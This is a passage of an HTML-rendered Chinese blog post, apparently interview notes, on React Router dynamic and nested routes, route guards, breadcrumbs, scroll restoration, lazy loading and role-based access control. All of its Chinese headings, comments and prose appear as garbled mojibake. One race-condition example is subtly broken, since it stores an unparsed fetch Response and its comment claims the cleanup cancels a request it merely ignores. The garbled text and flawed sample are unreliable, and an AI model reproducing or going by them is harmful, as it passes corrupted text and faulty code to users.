class_">Route</span>&gt;<br></code></pre></td></tr></table></figure><h3 id="å…³é”®ç‰¹æ€§ä¸æœ€ä½³å®è·µ"><a href="#å…³é”®ç‰¹æ€§ä¸æœ€ä½³å®è·µ" class="headerlink" title="å…³é”®ç‰¹æ€§ä¸æœ€ä½³å®è·µ"></a>å…³é”®ç‰¹æ€§ä¸æœ€ä½³å®è·µ</h3><p><strong>åŠ¨æ€è·¯å¾„ç”Ÿæˆ</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// æ ¹æ®æ•°æ®ç”ŸæˆåŠ¨æ€è·¯ç”±</span><br><span class="hljs-keyword">const</span> products = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetchProducts</span>();<br><br><span class="hljs-keyword">const</span> routes = products.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">product</span> =&gt;</span> (&#123;<br>  <span class="hljs-attr">path</span>: <span class="hljs-string">`products/<span class="hljs-subst">$&#123;product.slug&#125;</span>`</span>,<br>  <span class="hljs-attr">element</span>: <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ProductPage</span> /&gt;</span></span>,<br>  <span class="hljs-attr">loader</span>: <span class="hljs-function">() =&gt;</span> product<br>&#125;));<br></code></pre></td></tr></table></figure><p><strong>ç›¸å¯¹è·¯ç”±å¯¼èˆª</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// åœ¨ /dashboard/settings ä¸­</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">SettingsPage</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Link</span> <span class="hljs-attr">to</span>=<span class="hljs-string">&quot;../analytics&quot;</span>&gt;</span>è¿”å›åˆ†æ<span class="hljs-tag">&lt;/<span class="hljs-name">Link</span>&gt;</span> </span><br><span class="language-xml">      &#123;/* æŒ‡å‘ /dashboard/analytics */&#125;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>é”™è¯¯è¾¹ç•Œå¤„ç†</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// è·¯ç”±çº§é”™è¯¯å¤„ç†</span><br>&lt;<span class="hljs-title class_">Route</span><br>  path=<span class="hljs-string">&quot;projects/:projectId&quot;</span><br>  element=&#123;<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ProjectDetail</span> /&gt;</span></span>&#125;<br>  errorElement=&#123;<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ProjectError</span> /&gt;</span></span>&#125; <span class="hljs-comment">// æ•è·ç»„ä»¶æ¸²æŸ“é”™è¯¯</span><br>  loader=&#123;<span class="hljs-title function_">async</span> (&#123; params &#125;) =&gt; &#123;<br>    <span class="hljs-keyword">const</span> project = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetchProject</span>(params.<span class="hljs-property">projectId</span>);<br>    <span class="hljs-keyword">if</span> (!project) <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Response</span>(<span class="hljs-string">&quot;Not Found&quot;</span>, &#123; <span class="hljs-attr">status</span>: <span class="hljs-number">404</span> &#125;);<br>    <span class="hljs-keyword">return</span> project;<br>  &#125;&#125;<br>/&gt;<br></code></pre></td></tr></table></figure><h3 id="é¢è¯•é«˜é¢‘é—®é¢˜ä¸è§£å†³æ–¹æ¡ˆ"><a href="#é¢è¯•é«˜é¢‘é—®é¢˜ä¸è§£å†³æ–¹æ¡ˆ" class="headerlink" title="é¢è¯•é«˜é¢‘é—®é¢˜ä¸è§£å†³æ–¹æ¡ˆ"></a>é¢è¯•é«˜é¢‘é—®é¢˜ä¸è§£å†³æ–¹æ¡ˆ</h3><p><strong>åŠ¨æ€è·¯ç”±æ•°æ®åŠ è½½ç«æ€æ¡ä»¶</strong></p><p>é—®é¢˜ï¼šå¿«é€Ÿåˆ‡æ¢è·¯ç”±æ—¶ï¼Œåå‘è¯·æ±‚å¯èƒ½å…ˆè¿”å›å¯¼è‡´æ•°æ®é”™ä¹±</p><p>è§£å†³æ–¹æ¡ˆï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-keyword">let</span> isActive = <span class="hljs-literal">true</span>;<br>  <br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">fetchData</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"></span>) =&gt; &#123;<br>    <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`/api/products/<span class="hljs-subst">$&#123;productId&#125;</span>`</span>);<br>    <span class="hljs-keyword">if</span> (isActive) <span class="hljs-title function_">setProduct</span>(data);<br>  &#125;;<br><br>  <span class="hljs-title function_">fetchData</span>();<br>  <br>  <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> &#123; isActive = <span class="hljs-literal">false</span>; &#125;; <span class="hljs-comment">// æ¸…ç†å‡½æ•°å–æ¶ˆæ—§è¯·æ±‚</span><br>&#125;, [productId]);<br></code></pre></td></tr></table></figure><p><strong>åµŒå¥—è·¯ç”±æƒé™æ§åˆ¶</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// è·¯ç”±å®ˆå«ç»„ä»¶</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">ProtectedRoute</span> = (<span class="hljs-params">&#123; children, roles &#125;</span>) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> &#123; user &#125; = <span class="hljs-title function_">useAuth</span>();<br>  <br>  <span class="hljs-keyword">if</span> (!user) <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Navigate</span> <span class="hljs-attr">to</span>=<span class="hljs-string">&quot;/login&quot;</span> /&gt;</span></span>;<br>  <span class="hljs-keyword">if</span> (roles &amp;&amp; !roles.<span class="hljs-title function_">includes</span>(user.<span class="hljs-property">role</span>)) <br>    <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Navigate</span> <span class="hljs-attr">to</span>=<span class="hljs-string">&quot;/unauthorized&quot;</span> /&gt;</span></span>;<br>  <br>  <span class="hljs-keyword">return</span> children;<br>&#125;;<br><br><span class="hljs-comment">// ä½¿ç”¨</span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Route</span> </span></span><br><span class="hljs-tag"><span class="language-xml">  <span class="hljs-attr">path</span>=<span class="hljs-string">&quot;admin&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">  <span class="hljs-attr">element</span>=<span class="hljs-string">&#123;</span></span></span><br><span class="hljs-tag"><span class="language-xml">    &lt;<span class="hljs-attr">ProtectedRoute</span> <span class="hljs-attr">roles</span>=<span class="hljs-string">&#123;[</span>&#x27;<span class="hljs-attr">admin</span>&#x27;, &#x27;<span class="hljs-attr">superadmin</span>&#x27;]&#125;&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">AdminLayout</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">ProtectedRoute</span>&gt;</span></span><br><span class="language-xml">  &#125;</span><br><span class="language-xml">&gt;</span><br><span class="language-xml">  &#123;/* å­è·¯ç”±è‡ªåŠ¨ç»§æ‰¿ä¿æŠ¤ */&#125;</span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">Route</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p><strong>é¢åŒ…å±‘å¯¼èˆªå®ç°</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ä½¿ç”¨ useMatches() è·å–è·¯ç”±å±‚çº§</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Breadcrumbs</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> matches = <span class="hljs-title function_">useMatches</span>();<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">nav</span>&gt;</span></span><br><span class="language-xml">      &#123;matches</span><br><span class="language-xml">        .filter(match =&gt; match.handle?.breadcrumb)</span><br><span class="language-xml">        .map(match =&gt; (</span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&#123;match.pathname&#125;</span>&gt;</span></span><br><span class="language-xml">            &#123;match.handle.breadcrumb(match)&#125;</span><br><span class="language-xml">          <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><br><span class="language-xml">        ))&#125;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">nav</span>&gt;</span></span><br>  );<br>&#125;<br><br><span class="hljs-comment">// è·¯ç”±é…ç½®ä¸­æ·»åŠ å…ƒæ•°æ®</span><br>&lt;<span class="hljs-title class_">Route</span> <br>  path=<span class="hljs-string">&quot;products/:id&quot;</span><br>  element=&#123;<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ProductPage</span> /&gt;</span></span>&#125;<br>  handle=&#123;&#123; <span class="hljs-attr">breadcrumb</span>: <span class="hljs-function">(<span class="hljs-params">match</span>) =&gt;</span> <span class="hljs-string">`Product <span class="hljs-subst">$&#123;match.params.id&#125;</span>`</span> &#125;&#125;<br>/&gt;<br></code></pre></td></tr></table></figure><p><strong>æ»šåŠ¨ä½ç½®æ¢å¤</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// åˆ›å»ºè‡ªå®šä¹‰æ»šåŠ¨ç®¡ç†</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">ScrollToTop</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> location = <span class="hljs-title function_">useLocation</span>();<br>  <br>  <span class="hljs-title function_">useLayoutEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-comment">// æ’é™¤éœ€è¦ä¿ç•™æ»šåŠ¨ä½ç½®çš„è·¯ç”±</span><br>    <span class="hljs-keyword">if</span> (!location.<span class="hljs-property">state</span>?.<span class="hljs-property">preserveScroll</span>) &#123;<br>      <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">scrollTo</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    &#125;<br>  &#125;, [location.<span class="hljs-property">key</span>]);<br>  <br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br><br><span class="hljs-comment">// åœ¨æ ¹è·¯ç”±ä½¿ç”¨</span><br>&lt;<span class="hljs-title class_">Router</span>&gt;<br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ScrollToTop</span> /&gt;</span></span><br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Routes</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">Routes</span>&gt;</span></span><br>&lt;/<span class="hljs-title class_">Router</span>&gt;<br></code></pre></td></tr></table></figure><h3 id="æ€§èƒ½ä¼˜åŒ–æŠ€å·§-2"><a href="#æ€§èƒ½ä¼˜åŒ–æŠ€å·§-2" class="headerlink" title="æ€§èƒ½ä¼˜åŒ–æŠ€å·§"></a>æ€§èƒ½ä¼˜åŒ–æŠ€å·§</h3><p><strong>è·¯ç”±çº§ä»£ç åˆ†å‰²</strong>ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> <span class="hljs-title class_">ProductDetail</span> = <span class="hljs-title function_">lazy</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./ProductDetail&#x27;</span>));<br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Route</span> </span></span><br><span class="hljs-tag"><span class="language-xml">  <span class="hljs-attr">path</span>=<span class="hljs-string">&quot;products/:id&quot;</span> </span></span><br><span class="hljs-tag"><span class="language-xml">  <span class="hljs-attr">element</span>=<span class="hljs-string">&#123;</span></span></span><br><span class="hljs-tag"><span class="language-xml">    &lt;<span class="hljs-attr">Suspense</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">Loading</span> /&gt;</span>&#125;&gt;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">ProductDetail</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">Suspense</span>&gt;</span></span><br><span class="language-xml">  &#125;</span><br><span class="language-xml">/&gt;</span><br></code></pre></td></tr></table></figure><p><strong>é¢„åŠ è½½ç­–ç•¥</strong>ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// é¼ æ ‡æ‚¬åœæ—¶é¢„åŠ è½½è·¯ç”±ç»„ä»¶</span><br>&lt;<span class="hljs-title class_">Link</span> <br>  to=<span class="hljs-string">&quot;/dashboard/analytics&quot;</span><br>  onMouseEnter=&#123;<span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./AnalyticsPage&#x27;</span>)&#125;<br>&gt;<br>  åˆ†æé¢æ¿<br>&lt;/<span class="hljs-title class_">Link</span>&gt;<br></code></pre></td></tr></table></figure><h3 id="æ€»ç»“-4"><a href="#æ€»ç»“-4" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p><strong>åŠ¨æ€è·¯ç”±æ ¸å¿ƒ</strong>ï¼š</p><ul><li>ä½¿ç”¨ :param è¯­æ³•å®šä¹‰åŠ¨æ€æ®µ</li><li>é€šè¿‡ useParams() è·å–å‚æ•°</li><li>æ”¯æŒæ­£åˆ™çº¦æŸå’Œå¯é€‰å‚æ•°</li></ul><p><strong>åµŒå¥—è·¯ç”±æ ¸å¿ƒ</strong>ï¼š</p><ul><li>ä½¿ç”¨ <code>&lt;Outlet&gt;</code> ä½œä¸ºå­è·¯ç”±æ¸²æŸ“å‡ºå£</li><li>å¸ƒå±€è·¯ç”±å…±äº«UIç»“æ„</li><li>è·¯ç”±é…ç½®åæ˜ UIå±‚æ¬¡å…³ç³»</li></ul><p><strong>é«˜çº§æ¨¡å¼</strong>ï¼š</p><ul><li>æ•°æ®è·¯ç”±ï¼ˆv6.4+ï¼‰å®ç°é¢„åŠ è½½</li><li>ç›¸å¯¹å¯¼èˆªç®€åŒ–è·¯å¾„ç®¡ç†</li><li>é”™è¯¯è¾¹ç•Œå¢å¼ºå¥å£®æ€§</li></ul><p><strong>é¢è¯•é‡ç‚¹</strong>ï¼š</p><ul><li>åŠ¨æ€è·¯ç”±çš„æ•°æ®åŠ è½½é—®é¢˜</li><li>åµŒå¥—è·¯ç”±çš„æƒé™æ§åˆ¶æ–¹æ¡ˆ</li><li>å¤æ‚è·¯ç”±ç»“æ„è®¾è®¡èƒ½åŠ›</li><li>æ€§èƒ½ä¼˜åŒ–å®è·µ</li></ul><h2 id="6-3-è·¯ç”±å®ˆå«ä¸æƒé™æ§åˆ¶"><a href="#6-3-è·¯ç”±å®ˆå«ä¸æƒé™æ§åˆ¶" class="headerlink" title="6.3 è·¯ç”±å®ˆå«ä¸æƒé™æ§åˆ¶"></a>6.3 è·¯ç”±å®ˆå«ä¸æƒé™æ§åˆ¶</h2><h3 id="æƒé™æ§åˆ¶æ ¸å¿ƒæ¦‚å¿µ"><a href="#æƒé™æ§åˆ¶æ ¸å¿ƒæ¦‚å¿µ" class="headerlink" title="æƒé™æ§åˆ¶æ ¸å¿ƒæ¦‚å¿µ"></a>æƒé™æ§åˆ¶æ ¸å¿ƒæ¦‚å¿µ</h3><p><strong>æƒé™æ§åˆ¶ç±»å‹</strong></p><table><thead><tr><th align="left">ç±»å‹</th><th align="left">åœºæ™¯</th><th align="left">å®ç°éš¾åº¦</th></tr></thead><tbody><tr><td align="left">è·¯ç”±çº§å®ˆå«</td><td align="left">æ•´ä¸ªè·¯ç”±æ¨¡å—çš„è®¿é—®æ§åˆ¶</td><td align="left">â˜…â˜…â˜†</td></tr><tr><td align="left">ç»„ä»¶çº§å®ˆå«</td><td align="left">é¡µé¢å†…ç‰¹å®šåŠŸèƒ½çš„è®¿é—®æ§åˆ¶</td><td align="left">â˜…â˜…â˜…</td></tr><tr><td align="left">æ•°æ®çº§å®ˆå«</td><td align="left">API è¯·æ±‚å’Œæ•°æ®æ˜¾ç¤ºæ§åˆ¶</td><td align="left">â˜…â˜…â˜…â˜…</td></tr></tbody></table><p><strong>è®¤è¯ä¸æˆæƒ</strong></p><ul><li>è®¤è¯(Authentication)ï¼šéªŒè¯ç”¨æˆ·èº«ä»½ï¼ˆæ˜¯å¦ç™»å½•ï¼‰</li><li>æˆæƒ(Authorization)ï¼šéªŒè¯ç”¨æˆ·æƒé™ï¼ˆæ˜¯å¦æœ‰æƒè®¿é—®ï¼‰</li></ul><h3 id="åŸºç¡€è·¯ç”±å®ˆå«å®ç°"><a href="#åŸºç¡€è·¯ç”±å®ˆå«å®ç°" class="headerlink" title="åŸºç¡€è·¯ç”±å®ˆå«å®ç°"></a>åŸºç¡€è·¯ç”±å®ˆå«å®ç°</h3><p><strong>é«˜é˜¶ç»„ä»¶æ¨¡å¼ (HOC)</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// è·¯ç”±å®ˆå«é«˜é˜¶ç»„ä»¶</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">withAuth</span> = (<span class="hljs-params">Component, requiredRole = <span class="hljs-literal">null</span></span>) =&gt; &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-function">(<span class="hljs-params">props</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> &#123; user, isAuthenticated &#125; = <span class="hljs-title function_">useAuth</span>();<br>    <span class="hljs-keyword">const</span> location = <span class="hljs-title function_">useLocation</span>();<br>    <br>    <span class="hljs-keyword">if</span> (!isAuthenticated) &#123;<br>      <span class="hljs-comment">// æœªç™»å½•é‡å®šå‘åˆ°ç™»å½•é¡µ</span><br>      <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Navigate</span> <span class="hljs-attr">to</span>=<span class="hljs-string">&quot;/login&quot;</span> <span class="hljs-attr">state</span>=<span class="hljs-string">&#123;&#123;</span> <span class="hljs-attr">from:</span> <span class="hljs-attr">location</span> &#125;&#125; <span class="hljs-attr">replace</span> /&gt;</span></span>;<br>    &#125;<br>    <br>    <span class="hljs-keyword">if</span> (requiredRole &amp;&amp; user.<span class="hljs-property">role</span> !== requiredRole) &#123;<br>      <span class="hljs-comment">// æƒé™ä¸è¶³</span><br>      <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Navigate</span> <span class="hljs-attr">to</span>=<span class="hljs-string">&quot;/unauthorized&quot;</span> <span class="hljs-attr">replace</span> /&gt;</span></span>;<br>    &#125;<br>    <br>    <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Component</span> &#123;<span class="hljs-attr">...props</span>&#125; /&gt;</span></span>;<br>  &#125;;<br>&#125;;<br><br><span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">AdminDashboard</span> = <span class="hljs-title function_">withAuth</span>(<span class="hljs-title class_">DashboardComponent</span>, <span class="hljs-string">&#x27;admin&#x27;</span>);<br><br><span class="hljs-comment">// è·¯ç”±é…ç½®</span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Route</span> </span></span><br><span class="hljs-tag"><span class="language-xml">  <span class="hljs-attr">path</span>=<span class="hljs-string">&quot;/admin&quot;</span> </span></span><br><span class="hljs-tag"><span class="language-xml">  <span class="hljs-attr">element</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">AdminDashboard</span> /&gt;</span>&#125; </span><br><span class="language-xml">/&gt;</span><br></code></pre></td></tr></table></figure><p><strong>åŒ…è£…å™¨ç»„ä»¶æ¨¡å¼</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// è·¯ç”±å®ˆå«ç»„ä»¶</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">RouteGuard</span> = (<span class="hljs-params">&#123; children, roles &#125;</span>) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> &#123; user, isAuthenticated &#125; = <span class="hljs-title function_">useAuth</span>();<br>  <span class="hljs-keyword">const</span> location = <span class="hljs-title function_">useLocation</span>();<br>  <br>  <span class="hljs-keyword">if</span> (!isAuthenticated) &#123;<br>    <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Navigate</span> <span class="hljs-attr">to</span>=<span class="hljs-string">&quot;/login&quot;</span> <span class="hljs-attr">state</span>=<span class="hljs-string">&#123;&#123;</span> <span class="hljs-attr">from:</span> <span class="hljs-attr">location</span> &#125;&#125; <span class="hljs-attr">replace</span> /&gt;</span></span>;<br>  &#125;<br>  <br>  <span class="hljs-keyword">if</span> (roles &amp;&amp; !roles.<span class="hljs-title function_">includes</span>(user.<span class="hljs-property">role</span>)) &#123;<br>    <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;unauthorized&quot;</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>403 Forbidden<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>æ‚¨æ²¡æœ‰æƒé™è®¿é—®æ­¤é¡µé¢<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;<br>  &#125;<br>  <br>  <span class="hljs-keyword">return</span> children;<br>&#125;;<br><br><span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Route</span> </span></span><br><span class="hljs-tag"><span class="language-xml">  <span class="hljs-attr">path</span>=<span class="hljs-string">&quot;/dashboard&quot;</span> </span></span><br><span class="hljs-tag"><span class="language-xml">  <span class="hljs-attr">element</span>=<span class="hljs-string">&#123;</span></span></span><br><span class="hljs-tag"><span class="language-xml">    &lt;<span class="hljs-attr">RouteGuard</span> <span class="hljs-attr">roles</span>=<span class="hljs-string">&#123;[</span>&#x27;<span class="hljs-attr">user</span>&#x27;, &#x27;<span class="hljs-attr">admin</span>&#x27;]&#125;&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">DashboardPage</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">RouteGuard</span>&gt;</span></span><br><span class="language-xml">  &#125; </span><br><span class="language-xml">/&gt;</span><br></code></pre></td></tr></table></figure><h3 id="é«˜çº§æƒé™æ§åˆ¶æ–¹æ¡ˆ"><a href="#é«˜çº§æƒé™æ§åˆ¶æ–¹æ¡ˆ" class="headerlink" title="é«˜çº§æƒé™æ§åˆ¶æ–¹æ¡ˆ"></a>é«˜çº§æƒé™æ§åˆ¶æ–¹æ¡ˆ</h3><p><strong>åŸºäºè·¯ç”±é…ç½®çš„é›†ä¸­å¼ç®¡ç†</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// è·¯ç”±é…ç½®æ–‡ä»¶</span><br><span class="hljs-keyword">const</span> routes = [<br>  &#123;<br>    <span class="hljs-attr">path</span>: <span 